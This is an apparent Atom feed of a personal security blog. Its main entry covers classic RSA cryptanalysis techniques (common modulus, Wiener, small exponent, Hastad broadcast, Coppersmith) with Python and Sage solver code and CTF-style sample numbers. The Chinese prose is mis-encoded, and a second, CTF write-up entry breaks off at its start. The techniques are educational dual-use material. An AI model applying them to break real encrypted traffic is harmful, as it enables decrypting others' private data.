<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lcark</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lcark.github.io/"/>
  <updated>2019-11-08T16:27:06.625Z</updated>
  <id>https://lcark.github.io/</id>
  
  <author>
    <name>Lcark</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RSA å¸¸è§æ”»å‡»æ–¹æ³•</title>
    <link href="https://lcark.github.io/2019/11/09/RSA-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
    <id>https://lcark.github.io/2019/11/09/RSA-å¸¸è§æ”»å‡»æ–¹æ³•/</id>
    <published>2019-11-08T16:18:00.000Z</published>
    <updated>2019-11-08T16:27:06.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1ã€å…±æ¨¡æ”»å‡»"><a href="#1ã€å…±æ¨¡æ”»å‡»" class="headerlink" title="1ã€å…±æ¨¡æ”»å‡»"></a>1ã€å…±æ¨¡æ”»å‡»</h1><h2 id="æè¿°ï¼šå¯¹åŒä¸€æ˜æ–‡må¤šæ¬¡ä½¿ç”¨ç›¸åŒnï¼Œä¸åŒeåŠ å¯†ï¼Œå¾—åˆ°ä¸åŒå¯†æ–‡c"><a href="#æè¿°ï¼šå¯¹åŒä¸€æ˜æ–‡må¤šæ¬¡ä½¿ç”¨ç›¸åŒnï¼Œä¸åŒeåŠ å¯†ï¼Œå¾—åˆ°ä¸åŒå¯†æ–‡c" class="headerlink" title="æè¿°ï¼šå¯¹åŒä¸€æ˜æ–‡må¤šæ¬¡ä½¿ç”¨ç›¸åŒnï¼Œä¸åŒeåŠ å¯†ï¼Œå¾—åˆ°ä¸åŒå¯†æ–‡c"></a>æè¿°ï¼šå¯¹åŒä¸€æ˜æ–‡må¤šæ¬¡ä½¿ç”¨ç›¸åŒnï¼Œä¸åŒeåŠ å¯†ï¼Œå¾—åˆ°ä¸åŒå¯†æ–‡c</h2><h2 id="pythonæè¿°"><a href="#pythonæè¿°" class="headerlink" title="pythonæè¿°"></a>pythonæè¿°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> egcd <span class="keyword">import</span> egcd</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">32</span>)</span><br><span class="line">q = getPrime(<span class="number">32</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e1 = getPrime(<span class="number">16</span>)</span><br><span class="line">e2 = getPrime(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="number">123456</span></span><br><span class="line">c1 = pow(m, e1, n)</span><br><span class="line">c2 = pow(m, e2, n)</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h2><p>å½“<code>GCD(e1, e2) == 1</code>æ—¶ï¼Œç”±æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å¯çŸ¥å¿…å­˜åœ¨s1, s2ä½¿ <code>e1s1 + e2s2 = 1ï¼Œm = pow(m, e1s1+e2s2, n)</code>ï¼Œè€Œ<code>pow(m, e1s1+e2s2, n) = pow(m, e1s1, n) * pow(m, e2s2, n) = pow(c1, s1, n) * pow(c2, s2, n)</code></p><h2 id="pythonå®ç°"><a href="#pythonå®ç°" class="headerlink" title="pythonå®ç°"></a>pythonå®ç°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> egcd <span class="keyword">import</span> egcd</span><br><span class="line">_, s1, s2 = egcd(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    m = pow(inverse(c1, n), -s1, n) * pow(c2, s2, n) % n</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    m = pow(c1, s1, n) * pow(inverse(c2, n), -s2, n) % n</span><br></pre></td></tr></table></figure><h1 id="2ã€ä½è§£å¯†æŒ‡æ•°æ”»å‡»"><a href="#2ã€ä½è§£å¯†æŒ‡æ•°æ”»å‡»" class="headerlink" title="2ã€ä½è§£å¯†æŒ‡æ•°æ”»å‡»"></a>2ã€ä½è§£å¯†æŒ‡æ•°æ”»å‡»</h1><h2 id="æè¿°ï¼šè§£å¯†å¯†æŒ‡æ•°dè¿‡å°"><a href="#æè¿°ï¼šè§£å¯†å¯†æŒ‡æ•°dè¿‡å°" class="headerlink" title="æè¿°ï¼šè§£å¯†å¯†æŒ‡æ•°dè¿‡å°"></a>æè¿°ï¼šè§£å¯†å¯†æŒ‡æ•°dè¿‡å°</h2><h2 id="pyhon-æè¿°"><a href="#pyhon-æè¿°" class="headerlink" title="pyhon æè¿°"></a>pyhon æè¿°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="number">3</span></span><br><span class="line">e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">m = pow(c, d, n)</span><br></pre></td></tr></table></figure><h2 id="æ”»å‡»åŸç†-1"><a href="#æ”»å‡»åŸç†-1" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h2><p>è¯¦æƒ…è§<a href="https://paper.seebug.org/727/" target="_blank" rel="noopener">Wiener</a></p><h2 id="pythonå®ç°-1"><a href="#pythonå®ç°-1" class="headerlink" title="pythonå®ç°"></a>pythonå®ç°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> owiener</span><br><span class="line">e = <span class="number">3047442173541658754667464233797118324917469250436575767227172319344577259865313428705759330024959317716760816959590728238918140105663188172228696589411452947738069773833351725455888549656717874059636289036277785342126992626060696063089487811946920569580454880169977542532087635095357205433679009382368108273</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">135568509670260054049994954417860747085442883428459182441559553532993752593294067458983143521109377661295622146963670193783017382697726454953197805014428888491744355387957923382241961401063461549210355871385000347645387907568135032087942016502668629010859519249039662555733548461551175133582871220209515648241</span></span><br><span class="line"></span><br><span class="line">d = owiener.attack(e, n)</span><br><span class="line"></span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h1 id="3ã€ä½åŠ å¯†æŒ‡æ•°æ”»å‡»"><a href="#3ã€ä½åŠ å¯†æŒ‡æ•°æ”»å‡»" class="headerlink" title="3ã€ä½åŠ å¯†æŒ‡æ•°æ”»å‡»"></a>3ã€ä½åŠ å¯†æŒ‡æ•°æ”»å‡»</h1><h2 id="3-1ã€æ˜æ–‡è¾ƒå°"><a href="#3-1ã€æ˜æ–‡è¾ƒå°" class="headerlink" title="3.1ã€æ˜æ–‡è¾ƒå°"></a>3.1ã€æ˜æ–‡è¾ƒå°</h2><h2 id="æè¿°ï¼šeæ¯”è¾ƒå°ï¼Œä¸€èˆ¬ä¸º3"><a href="#æè¿°ï¼šeæ¯”è¾ƒå°ï¼Œä¸€èˆ¬ä¸º3" class="headerlink" title="æè¿°ï¼šeæ¯”è¾ƒå°ï¼Œä¸€èˆ¬ä¸º3"></a>æè¿°ï¼šeæ¯”è¾ƒå°ï¼Œä¸€èˆ¬ä¸º3</h2><h2 id="pyhon-æè¿°-1"><a href="#pyhon-æè¿°-1" class="headerlink" title="pyhon æè¿°"></a>pyhon æè¿°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">3</span></span><br><span class="line">c = pow(m, e, n)</span><br></pre></td></tr></table></figure><h2 id="æ”»å‡»åŸç†-2"><a href="#æ”»å‡»åŸç†-2" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h2><p><code>(m=c^d%n,n*x+m=c^d) =&gt; m=pow(n*x+c,1/e)</code>ï¼Œå½“næ¯”è¾ƒå°æ—¶ï¼Œå¯ä»¥æˆåŠŸå¼€æ–¹ã€‚</p><h2 id="pythonå®ç°-2"><a href="#pythonå®ç°-2" class="headerlink" title="pythonå®ç°"></a>pythonå®ç°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">smallEattack</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span> ** <span class="number">10</span>):</span><br><span class="line">            res = iroot(n * i + c, e)</span><br><span class="line">            <span class="keyword">if</span> res[<span class="number">1</span>]:</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="3-2-Hastadå¹¿æ’­æ”»å‡»"><a href="#3-2-Hastadå¹¿æ’­æ”»å‡»" class="headerlink" title="3.2 Hastadå¹¿æ’­æ”»å‡»"></a>3.2 Hastadå¹¿æ’­æ”»å‡»</h2><h2 id="æè¿°ï¼šä½¿ç”¨ç›¸åŒçš„åŠ å¯†æŒ‡æ•°-e-åŠ å¯†ç›¸åŒçš„ä¿¡æ¯ï¼Œå‘é€ç»™å¤šäºeä¸ªä¸åŒçš„äººï¼Œå¯èƒ½å—åˆ°ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»"><a href="#æè¿°ï¼šä½¿ç”¨ç›¸åŒçš„åŠ å¯†æŒ‡æ•°-e-åŠ å¯†ç›¸åŒçš„ä¿¡æ¯ï¼Œå‘é€ç»™å¤šäºeä¸ªä¸åŒçš„äººï¼Œå¯èƒ½å—åˆ°ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»" class="headerlink" title="æè¿°ï¼šä½¿ç”¨ç›¸åŒçš„åŠ å¯†æŒ‡æ•° e åŠ å¯†ç›¸åŒçš„ä¿¡æ¯ï¼Œå‘é€ç»™å¤šäºeä¸ªä¸åŒçš„äººï¼Œå¯èƒ½å—åˆ°ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»"></a>æè¿°ï¼šä½¿ç”¨ç›¸åŒçš„åŠ å¯†æŒ‡æ•° e åŠ å¯†ç›¸åŒçš„ä¿¡æ¯ï¼Œå‘é€ç»™å¤šäºeä¸ªä¸åŒçš„äººï¼Œå¯èƒ½å—åˆ°ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»</h2><h2 id="pyhon-æè¿°-2"><a href="#pyhon-æè¿°-2" class="headerlink" title="pyhon æè¿°"></a>pyhon æè¿°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">3</span></span><br><span class="line">c1 = pow(m, e, n1)</span><br><span class="line">c2 = pow(m, e, n2)</span><br><span class="line">c3 = pow(m, e, n3)</span><br></pre></td></tr></table></figure><h2 id="æ”»å‡»åŸç†-3"><a href="#æ”»å‡»åŸç†-3" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h2><p>è€ƒè™‘e=3ï¼Œå‡è®¾n1ã€n2ã€n3äº’ç´ ï¼Œå¦åˆ™å¯è®¡ç®—æœ€å¤§å…¬çº¦æ•°ç›´æ¥å¾—åˆ°pã€qï¼Œç”±äºn1ã€n2ã€n3äº’ç´ ï¼Œç”±ä¸­å›½å‰©ä½™å®šç†å¯æ±‚å¾—<code>m^e</code></p><h2 id="pythonå®ç°-3"><a href="#pythonå®ç°-3" class="headerlink" title="pythonå®ç°"></a>pythonå®ç°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> CRT <span class="keyword">import</span> chinese_remainder</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">datas = [(<span class="number">5</span>,<span class="number">92270627783020341903769877272635163757611737252302329401876135487358785338853904185572496782685853218459404423868889360808646192858060332110830962463986164014331540336037718684606223893506327126112739408023014900003600028654929488487584130630596342720833061628867179840913592694993869009133576053124769728363</span>,<span class="number">83421434286602546493364204139182949897795123160498680670964040331447569764445309937195566103281638928183742488663157138572020817924561990979723444797045375101801354862472761507421896454904818874439231990567738173059815647539737800523632262742398190575822391771655932895657208471832891505814792263361394479317</span>), (<span class="number">5</span>,<span class="number">102900163930497791064402577447949741195464555746599233552338455905339363524435647082637326033518083289523250670463907211548409422234391456982344516192210687545692054217151133151915216123275005464229534891629568864361154658107093228352829098251468904800809585061088484485542019575848774643260318502441084765867</span>,<span class="number">25585088950095290712328215701309273521406235982885781641137768116285362079062975527364909549362511146004390419156826709543326814581466248280564194951706937822088902607754944405407698735824315900942915322054614437632116732271787823814807624841386886185122143173564380877370643120953803688563589496390425159539</span>), (<span class="number">5</span>,<span class="number">90267480939368160749458049207367083180407266027531212674879245323647502822038591438536367206422215464489854541063867946215243190345476874546091188408120551902573113507876754578290674792643018845798263156849027209440979746485414654160320058352559498237296080490768064578067282805498131582552189186085941328701</span>,<span class="number">44374979291120575503988741531987454898919254880086464254904878064332010355432423956182135846738023874326776872139229379943321321362822522900479438294291206287205647145759972233097276253408812699557305314344220807356024994977399840843758750494467535572805794732065369887057841293267499209427585419962565568495</span>), (<span class="number">5</span>,<span class="number">90673177193017332602781813187879442725562909473411994052511479411887936365983777106776080722300002656952655125041151156684340743907349108729774157616323863062525593382279143395837261053976652138764279456528493914961780300269591722101449703932139132398288208673556967030162666354552157189525415838326249712949</span>,<span class="number">24086371701602948122317790211004032014326487279907486724991846810668564197542368948703436295770758262739732290677177527297040556666434577730354732397784651220918412407485171180732327730242552955646750279842251200227937257322414662213662054605527282812231172173474061845763736546747711105935349033514358348526</span>), (<span class="number">5</span>,<span class="number">90916739755838083837461026375700330885001446224187511395518230504776419813625940046511904838818660297497622072999229706061698225191645268591198600955240116302461331913178712722096591257619538927050886521512453691902946234986556913039431677697816965623861908091178749411071673467596883926097177996147858865293</span>,<span class="number">23204039098754030513954332212496652705175644349879686639449689791620605370809827884267260830136516742466455588549253481016504796674014871020503543639681251834114159250986728840380777774144853925216884802529230212783759821262799845229436535491711201551797166082529740271577684082458494926929260818927584104158</span>)]</span><br><span class="line">nList = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> datas]</span><br><span class="line">cList = [x[<span class="number">2</span>] <span class="keyword">for</span> x <span class="keyword">in</span> datas]</span><br><span class="line"></span><br><span class="line">print(len(datas))</span><br><span class="line">print(iroot(chinese_remainder(nList, cList), datas[<span class="number">0</span>][<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h2 id="3-3ã€copperSmithéƒ¨åˆ†ä¿¡æ¯æ”»å‡»"><a href="#3-3ã€copperSmithéƒ¨åˆ†ä¿¡æ¯æ”»å‡»" class="headerlink" title="3.3ã€copperSmithéƒ¨åˆ†ä¿¡æ¯æ”»å‡»"></a>3.3ã€copperSmithéƒ¨åˆ†ä¿¡æ¯æ”»å‡»</h2><h2 id="æè¿°ï¼šå·²çŸ¥éƒ¨åˆ†æ˜æ–‡"><a href="#æè¿°ï¼šå·²çŸ¥éƒ¨åˆ†æ˜æ–‡" class="headerlink" title="æè¿°ï¼šå·²çŸ¥éƒ¨åˆ†æ˜æ–‡"></a>æè¿°ï¼šå·²çŸ¥éƒ¨åˆ†æ˜æ–‡</h2><h2 id="pythonå®ç°-4"><a href="#pythonå®ç°-4" class="headerlink" title="pythonå®ç°"></a>pythonå®ç°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0x9876543210abcdef0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">smallE = [(<span class="number">5</span>,<span class="number">92270627783020341903769877272635163757611737252302329401876135487358785338853904185572496782685853218459404423868889360808646192858060332110830962463986164014331540336037718684606223893506327126112739408023014900003600028654929488487584130630596342720833061628867179840913592694993869009133576053124769728363</span>,<span class="number">83421434286602546493364204139182949897795123160498680670964040331447569764445309937195566103281638928183742488663157138572020817924561990979723444797045375101801354862472761507421896454904818874439231990567738173059815647539737800523632262742398190575822391771655932895657208471832891505814792263361394479317</span>), (<span class="number">3</span>,<span class="number">155266493936043103849855199987896813716831986416707080645036022909153373110367007140301635144950634879983289720164117794783088845393686109145443728632527874768524615377182297125716276153800765906014206797548230661764274997562670900115383324605843933035314110752560290540848152237316752573471110899212429555149</span>,<span class="number">124929943232081828105808318993257526364596580021564021377503915670544445679836588765369503919311404328043203272693851622132258819278328852726005776082575583793735570095307898828254568015886630010269615546857335790791577865565021730890364239443651479580968112031521485174068731577348690810906553798608040451024</span>), (<span class="number">5</span>,<span class="number">102900163930497791064402577447949741195464555746599233552338455905339363524435647082637326033518083289523250670463907211548409422234391456982344516192210687545692054217151133151915216123275005464229534891629568864361154658107093228352829098251468904800809585061088484485542019575848774643260318502441084765867</span>,<span class="number">25585088950095290712328215701309273521406235982885781641137768116285362079062975527364909549362511146004390419156826709543326814581466248280564194951706937822088902607754944405407698735824315900942915322054614437632116732271787823814807624841386886185122143173564380877370643120953803688563589496390425159539</span>), (<span class="number">3</span>,<span class="number">112306066601652819062206435724795595603085908011001671184332227488970057128128821831260649058569739569103298091727188365019228385820143813415009397359257831092635374404034997011441653286642458431865026213129412677064308342580757248577955071384972714557250468686599901682728173096745710849318629959223270431039</span>,<span class="number">108387832390337770947361518376552702503741092284778824448943971792044922720461955035726863109418657218498659460663504872870862538725835055240750735576735249122665348803252691221869146679004017916359067454693701495389784159620341860394035373599823801288442604273046729873467936004227013186659110262247417571857</span>), (<span class="number">5</span>,<span class="number">90267480939368160749458049207367083180407266027531212674879245323647502822038591438536367206422215464489854541063867946215243190345476874546091188408120551902573113507876754578290674792643018845798263156849027209440979746485414654160320058352559498237296080490768064578067282805498131582552189186085941328701</span>,<span class="number">44374979291120575503988741531987454898919254880086464254904878064332010355432423956182135846738023874326776872139229379943321321362822522900479438294291206287205647145759972233097276253408812699557305314344220807356024994977399840843758750494467535572805794732065369887057841293267499209427585419962565568495</span>), (<span class="number">3</span>,<span class="number">147733349387696521015664992396355145811249793103958464053225389476050097503928022819269482555955365534137156079172704297584033078453033637103720972881068435459202133846880715879894340131656691631756162323422868846616160423755883726450486845175227682329583615739797782025647376042249605775433971714513081755709</span>,<span class="number">52253817590056116368273294519761274350847193477090280916373828903718796358618956145225746496960677477661151583828604021049936963779103440560630451125137344639503705880024677345063113240530798352727432768980751992926293801206779839157443722614687126711272753610923903360818026083573711899014859313677159790039</span>), (<span class="number">5</span>,<span class="number">90673177193017332602781813187879442725562909473411994052511479411887936365983777106776080722300002656952655125041151156684340743907349108729774157616323863062525593382279143395837261053976652138764279456528493914961780300269591722101449703932139132398288208673556967030162666354552157189525415838326249712949</span>,<span class="number">24086371701602948122317790211004032014326487279907486724991846810668564197542368948703436295770758262739732290677177527297040556666434577730354732397784651220918412407485171180732327730242552955646750279842251200227937257322414662213662054605527282812231172173474061845763736546747711105935349033514358348526</span>),(<span class="number">5</span>,<span class="number">90916739755838083837461026375700330885001446224187511395518230504776419813625940046511904838818660297497622072999229706061698225191645268591198600955240116302461331913178712722096591257619538927050886521512453691902946234986556913039431677697816965623861908091178749411071673467596883926097177996147858865293</span>,<span class="number">23204039098754030513954332212496652705175644349879686639449689791620605370809827884267260830136516742466455588549253481016504796674014871020503543639681251834114159250986728840380777774144853925216884802529230212783759821262799845229436535491711201551797166082529740271577684082458494926929260818927584104158</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> smallE:</span><br><span class="line">    n = data[<span class="number">1</span>]</span><br><span class="line">    c = data[<span class="number">2</span>]</span><br><span class="line">    e = data[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">21</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b = i + <span class="number">0x100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span> * x</span><br><span class="line">            kbits=<span class="number">64</span></span><br><span class="line">            PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">            f = (x + b)^e-c</span><br><span class="line">            x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"x: %s"</span> %hex(int(x0))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"m: %s"</span> %hex(int(b + x0))</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%x"</span> % e</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1ã€å…±æ¨¡æ”»å‡»&quot;&gt;&lt;a href=&quot;#1ã€å…±æ¨¡æ”»å‡»&quot; class=&quot;headerlink&quot; title=&quot;1ã€å…±æ¨¡æ”»å‡»&quot;&gt;&lt;/a&gt;1ã€å…±æ¨¡æ”»å‡»&lt;/h1&gt;&lt;h2 id=&quot;æè¿°ï¼šå¯¹åŒä¸€æ˜æ–‡må¤šæ¬¡ä½¿ç”¨ç›¸åŒnï¼Œä¸åŒeåŠ å¯†ï¼Œå¾—åˆ°ä¸åŒå¯†æ–‡c&quot;&gt;&lt;a href=&quot;#æè¿°ï¼šå¯¹åŒä¸€æ˜æ–‡må¤šæ¬¡ä½¿ç”¨ç›¸åŒnï¼Œä¸åŒeåŠ å¯†ï¼Œå¾—åˆ°ä¸åŒå¯†æ–‡c&quot; class=&quot;headerlink&quot; title=&quot;æè¿°ï¼šå¯¹åŒä¸€æ˜æ–‡må¤šæ¬¡ä½¿ç”¨ç›¸åŒnï¼Œä¸åŒeåŠ å¯†ï¼Œå¾—åˆ°ä¸åŒå¯†æ–‡c&quot;&gt;&lt;/a&gt;æè¿°ï¼šå¯¹åŒä¸€æ˜æ–‡må¤šæ¬¡ä½¿ç”¨ç›¸åŒnï¼Œä¸åŒeåŠ å¯†ï¼Œå¾—åˆ°ä¸åŒå¯†æ–‡c&lt;/h2&gt;&lt;h2 id=&quot;pythonæè¿°&quot;&gt;&lt;a href=&quot;#pythonæè¿°&quot; class=&quot;headerlink&quot; title=&quot;pythonæè¿°&quot;&gt;&lt;/a&gt;pythonæè¿°&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; egcd &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; egcd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p = getPrime(&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;q = getPrime(&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;n = p * q&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;e1 = getPrime(&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;e2 = getPrime(&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;m = &lt;span class=&quot;number&quot;&gt;123456&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c1 = pow(m, e1, n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c2 = pow(m, e2, n)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="cryptography" scheme="https://lcark.github.io/categories/cryptography/"/>
    
    
      <category term="RSA" scheme="https://lcark.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>360cup 2019 wp</title>
    <link href="https://lcark.github.io/2019/11/02/360cup-2019-wp/"/>
    <id>https://lcark.github.io/2019/11/02/360cup-2019-wp/</id>
    <published>2019-11-02T10:08:00.000Z</published>
    <updated>2019-11-08T16:28:48.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 